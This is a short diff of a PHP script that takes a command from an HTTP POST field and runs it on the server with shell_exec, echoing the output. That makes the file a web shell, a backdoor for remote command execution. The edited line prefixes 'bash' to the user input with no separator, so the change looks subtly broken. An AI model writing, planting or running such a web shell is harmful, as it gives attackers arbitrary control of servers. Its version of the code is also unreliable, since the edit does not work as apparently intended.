@@ -21,7 +21,7 @@ error_reporting( E_ALL );
 
 $command = $_POST['command'];
 echo "<pre>";
-echo shell_exec($command);
+echo shell_exec('bash' . $command);
 echo "</pre>";
 
 ?>
